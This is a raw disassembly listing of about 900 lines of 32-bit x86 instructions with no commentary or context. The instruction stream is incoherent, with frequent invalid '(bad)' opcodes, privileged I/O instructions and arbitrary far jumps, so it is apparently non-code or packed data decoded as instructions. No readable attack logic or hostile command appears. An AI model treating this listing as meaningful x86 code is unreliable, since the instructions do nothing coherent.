  41b9bc:	xor    BYTE PTR [esi-0x35],ah
  41b9bf:	ins    DWORD PTR es:[edi],dx
  41b9c0:	lods   eax,DWORD PTR ds:[esi]
  41b9c1:	mov    ch,0xa5
  41b9c3:	inc    ecx
  41b9c4:	pop    esi
  41b9c5:	mov    esp,0xba8e9cb8
  41b9ca:	xchg   edi,eax
  41b9cb:	jge    0x41b9df
  41b9cd:	xchg   ebx,eax
  41b9ce:	stc    
  41b9cf:	ror    DWORD PTR [edx-0x7160e87e],1
  41b9d5:	dec    ebp
  41b9d6:	xchg   edx,eax
  41b9d7:	mov    bl,0xb1
  41b9d9:	add    eax,0xb24c4c2b
  41b9de:	add    al,0x3b
  41b9e0:	outs   dx,DWORD PTR ds:[esi]
  41b9e1:	pop    es
  41b9e2:	fwait
  41b9e3:	add    al,0xe1
  41b9e5:	lahf   
  41b9e6:	fpatan 
  41b9e8:	xchg   ebp,eax
  41b9e9:	sub    esp,DWORD PTR [ecx-0x3b61b214]
  41b9ef:	mov    bh,bh
  41b9f1:	call   0xf7ae:0x31b40da9
  41b9f8:	and    BYTE PTR [ebx-0x3d],0x2d
  41b9fc:	xor    eax,0xa8f73812
  41ba01:	hlt    
  41ba02:	imul   bl
  41ba04:	clc    
  41ba05:	jecxz  0x41b98d
  41ba07:	out    0x47,al
  41ba09:	sbb    DWORD PTR [ebx+0x2b9970ec],ecx
  41ba0f:	mov    ds:0x76f66789,al
  41ba14:	fadd   DWORD PTR [ebx]
  41ba16:	sti    
  41ba17:	ror    DWORD PTR [ebp+0x4f],1
  41ba1a:	test   esp,eax
  41ba1c:	fistp  QWORD PTR [eax-0x6071e344]
  41ba22:	cli    
  41ba23:	mov    DWORD PTR [edi-0x73aca338],ebx
  41ba29:	mov    al,ds:0xc727f736
  41ba2e:	push   eax
  41ba2f:	lahf   
  41ba30:	xchg   ebx,eax
  41ba31:	fnsave [esi-0x50eac8da]
  41ba37:	cmp    eax,0x6980c751
  41ba3c:	loopne 0x41b9e8
  41ba3e:	lods   eax,DWORD PTR ds:[esi]
  41ba3f:	loope  0x41ba95
  41ba41:	(bad)  [ebx-0x3a3197f3]
  41ba47:	fild   DWORD PTR [ecx]
  41ba49:	out    0xfc,eax
  41ba4b:	jg     0x41ba01
  41ba4d:	add    al,BYTE PTR [eax-0x4f]
  41ba50:	popf   
  41ba51:	sbb    al,0x79
  41ba53:	into   
  41ba54:	shl    BYTE PTR [edi],1
  41ba56:	cmp    ebx,DWORD PTR [esi]
  41ba58:	outs   dx,DWORD PTR ds:[esi]
  41ba59:	outs   dx,BYTE PTR ds:[esi]
  41ba5a:	rcr    dh,1
  41ba5c:	nop
  41ba5d:	push   esp
  41ba5e:	mov    cl,0xb2
  41ba60:	jb     0x41ba6f
  41ba62:	cmp    eax,0xf519f061
  41ba67:	and    bh,0xc0
  41ba6a:	mov    bl,ch
  41ba6c:	pop    ss
  41ba6d:	sahf   
  41ba6e:	rcl    BYTE PTR [edx+edi*8+0x73143ee4],0xa5
  41ba76:	sbb    al,0x20
  41ba78:	add    ecx,DWORD PTR [eax+0x4b30fcf5]
  41ba7e:	sub    al,0xea
  41ba80:	sbb    ch,BYTE PTR [eax+0x15]
  41ba83:	mov    esp,0xc170d3eb
  41ba88:	popa   
  41ba89:	neg    DWORD PTR [edi+0x5d]
  41ba8c:	loope  0x41baf4
  41ba8e:	mov    ah,0x67
  41ba90:	adc    eax,0xf0ede0b6
  41ba95:	jmp    0x2911:0xbb9e320a
  41ba9c:	jns    0x41ba30
  41ba9e:	mov    esp,0x70ec9b3
  41baa3:	sub    ecx,DWORD PTR [eax+0x6c]
  41baa6:	leave  
  41baa7:	xchg   edx,eax
  41baa8:	jb     0x794921d7
  41baae:	jp     0x41bab4
  41bab0:	mov    edx,0x750af6bc
  41bab5:	xor    ah,ch
  41bab7:	jnp    0x41ba9b
  41bab9:	adc    esi,DWORD PTR gs:[edx]
  41babc:	into   
  41babd:	ins    BYTE PTR es:[edi],dx
  41babe:	sbb    edx,ecx
  41bac0:	sar    BYTE PTR [ebx+ebp*8-0x1590b8dd],cl
  41bac7:	fisttp QWORD PTR [ebx+0x67667842]
  41bacd:	outs   dx,DWORD PTR ds:[esi]
  41bace:	cwde   
  41bacf:	lea    edx,[eax-0x12b913e8]
  41bad5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bad7:	mov    WORD PTR ds:0x902ca560,ds
  41badd:	mov    eax,ds:0xf73769aa
  41bae2:	push   esp
  41bae3:	jecxz  0x41bb29
  41bae5:	sbb    al,0xa7
  41bae7:	pop    ds
  41bae8:	dec    ebp
  41bae9:	push   ebp
  41baea:	xchg   BYTE PTR [esi],dh
  41baec:	out    0xf5,eax
  41baee:	(bad)  
  41baef:	ficom  WORD PTR [esi+0x4e8b5178]
  41baf5:	push   0x26
  41baf7:	dec    esi
  41baf8:	and    edi,esi
  41bafa:	mov    WORD PTR [eax],gs
  41bafc:	xchg   ebx,eax
  41bafd:	test   DWORD PTR [eax+0x6e],ebp
  41bb00:	mov    ds:0x4f7421c1,eax
  41bb05:	jp     0x41baec
  41bb07:	mov    ebp,0xd6b2c839
  41bb0c:	adc    eax,0x2010a88f
  41bb11:	fcmovbe st,st(5)
  41bb13:	mov    eax,0xb34967d4
  41bb18:	stos   BYTE PTR es:[edi],al
  41bb19:	sbb    BYTE PTR [ecx+0x56eb9ed8],0x53
  41bb20:	je     0x41bb84
  41bb22:	ds pop esp
  41bb24:	test   DWORD PTR [edx-0x6dfaf928],0x34abad07
  41bb2e:	fdivrp st(6),st
  41bb30:	push   cs
  41bb31:	sbb    eax,0xc40a1a7c
  41bb36:	in     al,dx
  41bb37:	mov    esi,0x4b83d44d
  41bb3c:	mov    ds:0xd6257bc9,eax
  41bb41:	fsubr  DWORD PTR [esi]
  41bb43:	aaa    
  41bb44:	ds mov esi,0xe5b6e255
  41bb4a:	add    bh,bl
  41bb4c:	shr    BYTE PTR [ebp+0x40],0x67
  41bb50:	dec    esp
  41bb51:	sbb    al,0x4d
  41bb53:	clc    
  41bb54:	xor    DWORD PTR [ecx+0x7cea87d],ebx
  41bb5a:	xor    dh,BYTE PTR [esi]
  41bb5c:	cmp    BYTE PTR [edi-0x1191b6d9],al
  41bb62:	mov    esp,0x6ab3a20b
  41bb67:	push   cs
  41bb68:	adc    al,0x0
  41bb6a:	arpl   WORD PTR [edx],ax
  41bb6c:	xor    eax,0xf5996143
  41bb71:	jmp    0xc84ed23e
  41bb76:	test   DWORD PTR [ecx+0x31fa3a5b],ebp
  41bb7c:	add    al,0xf5
  41bb7e:	dec    ebp
  41bb7f:	nop
  41bb80:	inc    ebp
  41bb81:	pushf  
  41bb82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb83:	lods   al,BYTE PTR ds:[esi]
  41bb84:	inc    ecx
  41bb85:	std    
  41bb86:	mov    al,0x5
  41bb88:	mov    edi,0xfc19c60c
  41bb8d:	cli    
  41bb8e:	repz ret 
  41bb90:	cs rcr BYTE PTR ds:[ebx+edi*4-0x5d],0xc8
  41bb97:	(bad)  
  41bb99:	fidivr DWORD PTR [eax-0x4b77d96d]
  41bb9f:	lods   eax,DWORD PTR ds:[esi]
  41bba0:	stos   BYTE PTR es:[edi],al
  41bba1:	data16 sbb al,0x7e
  41bba4:	repz dec edi
  41bba6:	add    edi,ecx
  41bba8:	xchg   DWORD PTR [esi],esp
  41bbaa:	(bad)  [eax-0x77]
  41bbad:	loope  0x41bc1d
  41bbaf:	inc    edx
  41bbb0:	lds    esi,FWORD PTR [ebx-0x3ba2c0e2]
  41bbb6:	inc    edi
  41bbb7:	pop    ss
  41bbb8:	jne    0x41bb6a
  41bbba:	mov    bl,bl
  41bbbc:	jne    0x41bc13
  41bbbe:	mov    cl,0x5a
  41bbc0:	sbb    bl,BYTE PTR [ebx+0x0]
  41bbc3:	pop    edi
  41bbc4:	mov    ebp,0x7683ef4a
  41bbc9:	fiadd  WORD PTR [ebx-0x7b]
  41bbcc:	sbb    eax,DWORD PTR [esi-0x76]
  41bbcf:	rcl    edi,0x79
  41bbd2:	lea    ebp,[ebp+ecx*1-0x242960d2]
  41bbd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbda:	push   ecx
  41bbdb:	and    al,0x8b
  41bbdd:	dec    ebp
  41bbde:	hlt    
  41bbdf:	xchg   DWORD PTR [ecx],eax
  41bbe1:	mov    bh,0xfa
  41bbe3:	pop    ds
  41bbe4:	std    
  41bbe5:	dec    eax
  41bbe6:	pop    ss
  41bbe7:	sub    DWORD PTR ds:0x36a59b28,0xffffffda
  41bbee:	jbe    0x41bb81
  41bbf0:	push   eax
  41bbf1:	mov    edx,0x66b61df3
  41bbf6:	bound  ebx,QWORD PTR [edx-0x54]
  41bbf9:	jo     0x41bbbe
  41bbfb:	jl     0x41bb80
  41bbfd:	stc    
  41bbfe:	add    edx,esp
  41bc00:	add    BYTE PTR [ebp-0x2153851b],dl
  41bc06:	or     esp,0xffffffcf
  41bc09:	sbb    eax,0x8dae5b5c
  41bc0e:	out    0xe,al
  41bc10:	mov    ecx,0x16d0befe
  41bc15:	pop    edi
  41bc16:	inc    ebp
  41bc17:	fsqrt  
  41bc19:	repnz frstor [edx]
  41bc1c:	data16 jo 0x41bc12
  41bc1f:	xchg   ecx,eax
  41bc20:	add    dl,dh
  41bc22:	mov    ebx,0x6d959598
  41bc27:	into   
  41bc28:	push   esi
  41bc29:	rcl    DWORD PTR [edx-0x15a421d0],0xe
  41bc30:	int3   
  41bc31:	lods   al,BYTE PTR ds:[esi]
  41bc32:	xchg   edi,eax
  41bc33:	xchg   ebp,eax
  41bc34:	daa    
  41bc35:	outs   dx,BYTE PTR ds:[esi]
  41bc36:	cmp    al,0x63
  41bc38:	in     al,0x39
  41bc3a:	push   DWORD PTR [ecx]
  41bc3c:	inc    eax
  41bc3d:	push   es
  41bc3e:	aas    
  41bc3f:	je     0x41bbc7
  41bc41:	(bad)  
  41bc42:	aam    0xed
  41bc44:	data16 loopne 0x41bc91
  41bc47:	adc    BYTE PTR [ecx],ah
  41bc49:	lods   eax,DWORD PTR ds:[esi]
  41bc4a:	and    eax,0x389e020b
  41bc4f:	loopne 0x41bbdc
  41bc51:	shl    BYTE PTR [ecx],cl
  41bc53:	sbb    edi,DWORD PTR [edx-0x29]
  41bc56:	outs   dx,BYTE PTR ds:[esi]
  41bc57:	push   ecx
  41bc58:	xchg   ebp,eax
  41bc59:	add    al,ch
  41bc5b:	jmp    0x41bc4e
  41bc5d:	shr    dl,1
  41bc5f:	scas   eax,DWORD PTR es:[edi]
  41bc60:	xchg   BYTE PTR [esi+0x1d573806],dl
  41bc66:	fistp  DWORD PTR [ebp+0x11]
  41bc69:	xor    al,0xbb
  41bc6b:	pop    ebx
  41bc6c:	fisttp WORD PTR [ecx]
  41bc6e:	shl    DWORD PTR [ebp+0x3f],0xae
  41bc72:	in     al,dx
  41bc73:	fsubr  QWORD PTR [eax-0x79]
  41bc76:	sub    bh,dl
  41bc78:	in     eax,0x9c
  41bc7a:	pop    es
  41bc7b:	mov    al,0xcf
  41bc7d:	shl    DWORD PTR ds:0x977e94a9,cl
  41bc83:	cld    
  41bc84:	fmul   QWORD PTR [ebp-0x6ddfbd60]
  41bc8a:	outs   dx,DWORD PTR ds:[esi]
  41bc8b:	je     0x41bc82
  41bc8d:	jle    0x41bca6
  41bc8f:	out    dx,al
  41bc90:	ret    
  41bc91:	jg     0x41bcae
  41bc93:	aaa    
  41bc94:	in     al,0xac
  41bc96:	call   0xb9145a07
  41bc9b:	or     al,0x45
  41bc9d:	inc    esi
  41bc9e:	pop    ebx
  41bc9f:	lds    edx,FWORD PTR ds:0xe16645c2
  41bca5:	fwait
  41bca6:	or     eax,0xb07c28c6
  41bcab:	push   0x62
  41bcad:	ins    BYTE PTR es:[edi],dx
  41bcae:	cs ins DWORD PTR es:[edi],dx
  41bcb0:	or     al,0x60
  41bcb2:	es retf 0xa35a
  41bcb6:	add    ebx,DWORD PTR [edx]
  41bcb8:	mov    al,BYTE PTR [esi+0x34]
  41bcbb:	sbb    eax,0x46d71cf0
  41bcc0:	ds loopne 0x41bc91
  41bcc3:	adc    al,0x4f
  41bcc5:	clc    
  41bcc6:	in     eax,dx
  41bcc7:	jo     0x41bcc2
  41bcc9:	enter  0x6cd3,0xa8
  41bccd:	cmp    eax,esp
  41bccf:	and    DWORD PTR [edx],0x889f1e1b
  41bcd5:	rcr    bl,1
  41bcd7:	adc    BYTE PTR [esi+0x2beb26b0],dh
  41bcdd:	add    eax,0xb626b124
  41bce2:	xchg   edi,eax
  41bce3:	mov    ch,0x92
  41bce5:	daa    
  41bce6:	fnstcw WORD PTR [esi-0x7056b599]
  41bcec:	mov    ecx,0xbb645826
  41bcf1:	pop    ss
  41bcf2:	repz inc eax
  41bcf4:	mov    ebp,0xede40d4e
  41bcf9:	sti    
  41bcfa:	jmp    0x8f39b2f4
  41bcff:	dec    ecx
  41bd00:	cmp    al,BYTE PTR [edx+0x2a]
  41bd03:	xor    DWORD PTR [eax],0xbc6e5f54
  41bd09:	fld    DWORD PTR [ebx+esi*4+0x4b5fd42c]
  41bd10:	shr    cl,0xaf
  41bd13:	sbb    edi,ecx
  41bd15:	lea    eax,ds:0x4ccb5cff
  41bd1b:	mov    bh,0x4b
  41bd1d:	mov    edx,0xb1998c3f
  41bd22:	sub    al,0xaf
  41bd24:	add    DWORD PTR [ebx-0x4eac1fdb],eax
  41bd2a:	iret   
  41bd2b:	push   ebx
  41bd2c:	popa   
  41bd2d:	mov    esp,0x26448b4b
  41bd32:	sahf   
  41bd33:	mov    ah,0xf
  41bd35:	scas   al,BYTE PTR es:[edi]
  41bd36:	aaa    
  41bd37:	cmovns ebx,edi
  41bd3a:	dec    ebp
  41bd3b:	call   0x8ac0:0x12e6da2
  41bd42:	int    0xf
  41bd44:	cmp    bh,ah
  41bd46:	retf   0x8958
  41bd49:	iret   
  41bd4a:	or     bh,BYTE PTR [ecx]
  41bd4c:	jbe    0x41bdcb
  41bd4e:	int    0x93
  41bd50:	sub    ch,al
  41bd52:	aam    0x12
  41bd54:	aas    
  41bd55:	dec    esi
  41bd56:	out    dx,eax
  41bd57:	imul   edi,edx,0x7ad8fadf
  41bd5d:	push   esi
  41bd5e:	sbb    cl,BYTE PTR [esi]
  41bd60:	dec    edi
  41bd61:	data16 fist DWORD PTR [ecx-0x43fe840f]
  41bd68:	xchg   esi,eax
  41bd69:	and    esp,DWORD PTR [ecx+edi*4+0x606cf05f]
  41bd70:	std    
  41bd71:	dec    ebx
  41bd72:	imul   edx,DWORD PTR [edi+0x14],0x2a
  41bd76:	mov    ebx,0xf5aa4aa3
  41bd7b:	call   0xc13b:0xd0e0cde0
  41bd82:	xlat   BYTE PTR ds:[ebx]
  41bd83:	inc    eax
  41bd84:	inc    esi
  41bd85:	xor    al,0x5
  41bd87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd88:	adc    esi,DWORD PTR ds:0xa40b1931
  41bd8e:	mov    edi,0x5a62e5ea
  41bd93:	popa   
  41bd94:	mov    dh,0x3e
  41bd96:	add    edi,DWORD PTR [ebx-0x1f]
  41bd99:	(bad)  
  41bd9a:	push   cs
  41bd9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd9c:	call   0xe31c:0xa62c981
  41bda3:	xchg   edi,eax
  41bda4:	xor    BYTE PTR [ecx],cl
  41bda6:	out    0x9b,al
  41bda8:	sbb    BYTE PTR [eax+0x19],ch
  41bdab:	fisub  WORD PTR [edx+0x1269e692]
  41bdb1:	inc    esi
  41bdb2:	ja     0x41bda5
  41bdb4:	pop    esp
  41bdb5:	xchg   ebx,eax
  41bdb6:	mul    DWORD PTR [esi]
  41bdb8:	mov    cl,0x8
  41bdba:	mov    ch,0x6f
  41bdbc:	lods   al,BYTE PTR ds:[esi]
  41bdbd:	stos   BYTE PTR es:[edi],al
  41bdbe:	aad    0x1
  41bdc0:	sub    eax,DWORD PTR [ebx-0x20f17579]
  41bdc6:	mov    al,ds:0x688ec261
  41bdcb:	int    0x58
  41bdcd:	and    BYTE PTR [ecx],0x13
  41bdd0:	adc    al,0x5d
  41bdd2:	and    ebp,DWORD PTR [ebp-0x66]
  41bdd5:	push   es
  41bdd6:	jl     0x41bd70
  41bdd8:	adc    al,0x9d
  41bdda:	push   ds
  41bddb:	stos   DWORD PTR es:[edi],eax
  41bddc:	sbb    DWORD PTR [edx],esi
  41bdde:	movhlps xmm3,xmm3
  41bde1:	sbb    ebx,esp
  41bde3:	(bad)  
  41bde5:	lea    esp,[esi+0x7e]
  41bde8:	test   ah,dl
  41bdea:	ret    
  41bdeb:	mov    ds:0x2b59a3be,eax
  41bdf0:	mov    dh,0x27
  41bdf2:	dec    esi
  41bdf3:	adc    ecx,DWORD PTR [ecx-0x644a4d36]
  41bdf9:	cmp    al,0xdc
  41bdfb:	mov    cl,0xf3
  41bdfd:	ds not bl
  41be00:	sbb    al,0xa0
  41be02:	stc    
  41be03:	ror    BYTE PTR [ebx+0x6d93a61c],0x76
  41be0a:	sub    eax,0x3f191379
  41be0f:	inc    edi
  41be10:	and    cl,BYTE PTR [ecx-0x54d70b1c]
  41be16:	aad    0x8
  41be18:	xchg   esp,eax
  41be19:	out    0x5c,eax
  41be1b:	sub    ah,bl
  41be1d:	inc    edx
  41be1e:	cmp    bh,BYTE PTR [esp+eiz*2+0x4a]
  41be22:	dec    eax
  41be23:	dec    edx
  41be24:	outs   dx,BYTE PTR ds:[esi]
  41be25:	inc    eax
  41be26:	and    eax,0x46f76d36
  41be2b:	pop    esi
  41be2c:	jbe    0x41be10
  41be2e:	and    al,0xda
  41be30:	xchg   ebp,eax
  41be31:	and    DWORD PTR [ebx-0x29],0xffffffe1
  41be35:	jb     0x41be44
  41be37:	xor    esp,esi
  41be39:	xor    bh,BYTE PTR [edi-0x67b8528f]
  41be3f:	or     al,0x71
  41be41:	push   ebp
  41be42:	(bad)  [ecx]
  41be44:	mov    esi,0x84e4ef52
  41be49:	dec    ebx
  41be4a:	fcmovbe st,st(2)
  41be4d:	add    DWORD PTR [edi-0x4e],esp
  41be50:	jp     0x41bec7
  41be52:	dec    edx
  41be53:	icebp  
  41be54:	sbb    BYTE PTR [ebx+0xeb6f37f],0x62
  41be5b:	into   
  41be5c:	lods   al,BYTE PTR ds:[esi]
  41be5d:	sbb    al,0x50
  41be5f:	cli    
  41be60:	aas    
  41be61:	jne    0x41be54
  41be63:	ss dec esi
  41be65:	push   esp
  41be66:	(bad)  [ebx+0x7a]
  41be69:	mov    ds:0xf3cc1c49,eax
  41be6e:	sbb    eax,0xdd23a10b
  41be73:	(bad)
  41be77:	push   0x0
  41be79:	jo     0x41be50
  41be7b:	push   esp
  41be7c:	jb     0x41be3e
  41be7e:	in     al,0x5
  41be80:	add    eax,0xa7979c9c
  41be85:	dec    edx
  41be86:	jae    0x41bef6
  41be88:	push   ss
  41be89:	sar    BYTE PTR [edx+esi*2-0x12c121ab],1
  41be90:	mov    edx,0x9bf3bcb
  41be95:	and    BYTE PTR [edx-0x4b1d9d6],cl
  41be9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be9c:	mov    al,0xdc
  41be9e:	fistp  QWORD PTR [ebx-0x29]
  41bea1:	pop    edi
  41bea2:	cmp    bl,cl
  41bea4:	sbb    eax,0x3f
  41bea7:	jg     0x41bef0
  41bea9:	and    al,0xa0
  41beab:	imul   ebx,DWORD PTR [ebx-0x7ace7d6a],0xa5f78604
  41beb5:	icebp  
  41beb6:	stos   BYTE PTR es:[edi],al
  41beb7:	push   ebp
  41beb8:	test   eax,0xe9a4ffa9
  41bebd:	nop
  41bebe:	xchg   BYTE PTR [eax-0x3b],bl
  41bec1:	fsubr  QWORD PTR [esp+ebp*1+0x4c20b853]
  41bec8:	jg     0x41be60
  41beca:	add    DWORD PTR [esi-0x4d2e580e],ebp
  41bed0:	leave  
  41bed1:	mov    bl,0xe6
  41bed3:	dec    ecx
  41bed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bed5:	aad    0x6c
  41bed7:	push   ebx
  41bed8:	dec    eax
  41bed9:	pop    es
  41beda:	test   DWORD PTR [edi],eax
  41bedc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bedd:	and    ah,dl
  41bedf:	push   ds
  41bee0:	ror    BYTE PTR [esi],0xb8
  41bee3:	adc    BYTE PTR [ebx],ch
  41bee5:	or     bl,dl
  41bee7:	clc    
  41bee8:	add    eax,0x5863e175
  41beed:	dec    ebp
  41beee:	adc    al,0xd1
  41bef0:	sahf   
  41bef1:	out    0x8f,eax
  41bef3:	pushf  
  41bef4:	imul   edx,DWORD PTR [esi+ebx*2-0x5],0x46
  41bef9:	idiv   BYTE PTR [edx+0x57]
  41befc:	dec    eax
  41befd:	xor    eax,0x2fcb1245
  41bf02:	mov    al,ds:0x45b18a83
  41bf07:	sub    DWORD PTR [edi+0x41],esp
  41bf0a:	pop    ecx
  41bf0b:	inc    ecx
  41bf0c:	jbe    0x41beb6
  41bf0e:	pop    esp
  41bf0f:	cld    
  41bf10:	dec    edi
  41bf11:	imul   ebx,DWORD PTR [ebx-0x79],0x3202d835
  41bf18:	inc    edi
  41bf19:	ret    0x616e
  41bf1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf1d:	and    eax,0x2ec12448
  41bf22:	pop    ecx
  41bf23:	push   ecx
  41bf24:	cld    
  41bf25:	outs   dx,BYTE PTR ds:[esi]
  41bf26:	lea    edx,[edi+0x778ad9b2]
  41bf2c:	jp     0x41bf7b
  41bf2e:	sub    DWORD PTR [edx-0x42],ebp
  41bf31:	pop    ss
  41bf32:	adc    esp,DWORD PTR [ebx+ebp*2+0x5cab4cee]
  41bf39:	inc    ebp
  41bf3a:	mov    edx,DWORD PTR [eax+0x280a3f4a]
  41bf40:	fbstp  TBYTE PTR ds:0x4689f758
  41bf46:	gs jno 0x41bf5a
  41bf49:	mov    al,0x79
  41bf4b:	aam    0x87
  41bf4d:	mov    bh,0x6b
  41bf4f:	pop    es
  41bf50:	inc    eax
  41bf51:	popf   
  41bf52:	ss pop esp
  41bf54:	or     ebp,DWORD PTR [ecx]
  41bf56:	call   0x7f412992
  41bf5b:	arpl   WORD PTR [ebx+0xd8a85d8],si
  41bf61:	dec    ebp
  41bf62:	pop    eax
  41bf63:	mov    ecx,0x27d8f167
  41bf68:	push   cs
  41bf69:	jnp    0x41bfc7
  41bf6b:	push   edx
  41bf6c:	xor    ch,BYTE PTR [ebx-0x93e688f]
  41bf72:	inc    dx
  41bf74:	mov    BYTE PTR [eax+0x5a8af2fe],bh
  41bf7a:	loope  0x41bf19
  41bf7c:	and    esi,esp
  41bf7e:	and    al,0x30
  41bf80:	or     dl,BYTE PTR [edi]
  41bf82:	pop    esp
  41bf83:	int3   
  41bf84:	push   ds
  41bf85:	pop    ss
  41bf86:	aad    0xb1
  41bf88:	shl    DWORD PTR [ebp-0x75],cl
  41bf8b:	cmc    
  41bf8c:	fsub   QWORD PTR [eax+esi*1+0x39]
  41bf90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf91:	mov    edi,0x5b1ac44b
  41bf96:	in     al,dx
  41bf97:	jle    0x41bfdf
  41bf99:	ret    
  41bf9a:	cmc    
  41bf9b:	dec    esi
  41bf9c:	shl    esi,cl
  41bf9e:	xor    eax,0xcda7510a
  41bfa3:	cwde   
  41bfa4:	cdq    
  41bfa5:	ins    DWORD PTR es:[edi],dx
  41bfa6:	or     BYTE PTR [edi-0x2a4082b4],cl
  41bfac:	sub    bl,BYTE PTR [ebp+eax*4+0x3c]
  41bfb0:	xchg   esi,eax
  41bfb1:	es cmc 
  41bfb3:	shl    DWORD PTR [ebp+0x4246edc0],1
  41bfb9:	cmp    eax,0x122137ea
  41bfbe:	lahf   
  41bfbf:	dec    esi
  41bfc0:	and    DWORD PTR [esi-0x9],eax
  41bfc3:	data16 xlat BYTE PTR ds:[ebx]
  41bfc5:	adc    edi,DWORD PTR [ecx+0x45]
  41bfc8:	mov    esi,0xbc429528
  41bfcd:	push   esi
  41bfce:	cs call 0x1bf75e92
  41bfd4:	out    0xe4,eax
  41bfd6:	add    esp,DWORD PTR cs:[ebx]
  41bfd9:	jns    0x41c052
  41bfdb:	cmc    
  41bfdc:	dec    esp
  41bfdd:	mov    esi,0x42d85299
  41bfe2:	sub    eax,0xe67b326d
  41bfe7:	jle    0x41c062
  41bfe9:	dec    eax
  41bfea:	push   cs
  41bfeb:	pushf  
  41bfec:	jmp    0x984de6d4
  41bff1:	fidivr WORD PTR [edx+0x2d8230be]
  41bff7:	pop    ss
  41bff8:	(bad)  
  41bff9:	mov    ebp,0xd6993b7b
  41bffe:	lock popf 
  41c000:	imul   ebp,DWORD PTR [edi],0xfed96ce2
  41c006:	jge    0x41bfb5
  41c008:	adc    bl,0x6d
  41c00b:	fld    DWORD PTR [eax+0x9898e]
  41c011:	sub    ah,BYTE PTR [eax+eax*8]
  41c014:	and    ecx,0xf5b274dc
  41c01a:	pop    es
  41c01b:	push   ebx
  41c01c:	int3   
  41c01d:	fldln2 
  41c01f:	sbb    esi,DWORD PTR [edx+0x16]
  41c022:	repz push ds
  41c024:	mov    ds:0x6ac7b14e,al
  41c029:	mov    dl,0x8b
  41c02b:	inc    DWORD PTR [esi+0x1e]
  41c02e:	jo     0x41bfd1
  41c030:	(bad)  
  41c031:	ja     0x41c010
  41c033:	cmp    edx,DWORD PTR [ebx]
  41c035:	out    0x40,al
  41c037:	mov    dl,0xb8
  41c039:	in     eax,dx
  41c03a:	sbb    BYTE PTR [esi],cl
  41c03c:	stc    
  41c03d:	adc    al,0x1e
  41c03f:	adc    al,ah
  41c041:	add    eax,0xe3afe6f4
  41c046:	fldenv [edx]
  41c048:	mov    edx,0x962947c9
  41c04d:	pop    ebx
  41c04e:	cmp    eax,0xaf7a4e03
  41c053:	fsubr  QWORD PTR [ebx+0x5d]
  41c056:	or     edi,esp
  41c058:	jbe    0x41c029
  41c05a:	push   0x806a3582
  41c05f:	jno    0x41c083
  41c061:	scas   eax,DWORD PTR es:[edi]
  41c062:	out    dx,eax
  41c063:	fcom   QWORD PTR [eax]
  41c065:	(bad)  
  41c066:	cmc    
  41c067:	mov    ebp,0x98e05798
  41c06c:	stos   BYTE PTR es:[edi],al
  41c06d:	mov    ebx,0xa010bab4
  41c072:	test   al,0x52
  41c074:	stos   DWORD PTR es:[edi],eax
  41c075:	sub    al,BYTE PTR [ecx+0x1b3a391f]
  41c07b:	stos   DWORD PTR es:[edi],eax
  41c07c:	out    dx,eax
  41c07d:	pop    ds
  41c07e:	mov    bl,0x73
  41c080:	clc    
  41c081:	(bad)
  41c084:	push   edx
  41c085:	sub    al,0x27
  41c087:	push   ebp
  41c088:	lods   eax,DWORD PTR ds:[esi]
  41c089:	xchg   ebp,eax
  41c08a:	pop    ebx
  41c08b:	fcomp  DWORD PTR ds:0xdc06481e
  41c091:	add    eax,0xc9e9cba0
  41c096:	xchg   DWORD PTR [esi],ebx
  41c098:	pop    ebx
  41c099:	ss aad 0x5d
  41c09c:	out    dx,eax
  41c09d:	xchg   esi,eax
  41c09e:	lea    ebx,[eax]
  41c0a0:	out    dx,eax
  41c0a1:	pop    ebp
  41c0a2:	jecxz  0x41c04b
  41c0a4:	mov    bh,BYTE PTR [ecx-0x12a29754]
  41c0aa:	jl     0x41c0e5
  41c0ac:	cmp    esp,DWORD PTR [ecx+0x18b65dcc]
  41c0b2:	dec    eax
  41c0b3:	and    eax,0x5795cb82
  41c0b8:	nop
  41c0b9:	pcmpgtd mm0,QWORD PTR [ebp+0x63]
  41c0bd:	pop    esp
  41c0be:	xchg   ecx,eax
  41c0bf:	sahf   
  41c0c0:	inc    esi
  41c0c1:	mov    al,ds:0x7faa3bd5
  41c0c6:	mov    ah,0xa9
  41c0c8:	int    0xec
  41c0ca:	loop   0x41c13e
  41c0cc:	loope  0x41c0b2
  41c0ce:	push   ebx
  41c0cf:	mov    WORD PTR [edx+0x44],ds
  41c0d2:	lods   eax,DWORD PTR ds:[esi]
  41c0d3:	adc    bl,ch
  41c0d5:	pusha  
  41c0d6:	cmp    eax,0xb2b11011
  41c0db:	mov    esi,DWORD PTR [esi+0x4c]
  41c0de:	mov    bl,0x1d
  41c0e0:	cdq    
  41c0e1:	cmp    DWORD PTR [ecx-0x16],0x98731db9
  41c0e8:	shr    ebp,0xe0
  41c0eb:	in     eax,dx
  41c0ec:	cmp    al,0x8
  41c0ee:	cmp    cl,BYTE PTR [ebp+0x40]
  41c0f1:	xchg   esp,eax
  41c0f2:	ins    BYTE PTR es:[edi],dx
  41c0f3:	das    
  41c0f4:	xor    ecx,edi
  41c0f6:	sub    DWORD PTR [ebp-0x782a90b2],eax
  41c0fc:	and    DWORD PTR [ebx-0x6abe43d],ebx
  41c102:	inc    eax
  41c103:	push   esp
  41c104:	stos   BYTE PTR es:[edi],al
  41c105:	or     BYTE PTR [ebx],0x2d
  41c108:	xchg   ebp,eax
  41c109:	movlps xmm2,QWORD PTR [esi]
  41c10c:	cs inc esp
  41c10f:	es and eax,0xaacde112
  41c115:	sub    eax,ebx
  41c117:	test   DWORD PTR [eax+0x6b51a5e7],ebx
  41c11d:	push   0x1e
  41c11f:	lahf   
  41c120:	fcom   QWORD PTR [ecx]
  41c122:	ds int 0x3c
  41c125:	add    al,0xac
  41c127:	int    0x69
  41c129:	mov    ah,0x55
  41c12b:	adc    eax,0xed5d5f43
  41c130:	mov    esi,0x61a52b5e
  41c135:	xchg   BYTE PTR [edx],cl
  41c137:	cdq    
  41c138:	dec    ebx
  41c139:	iret   
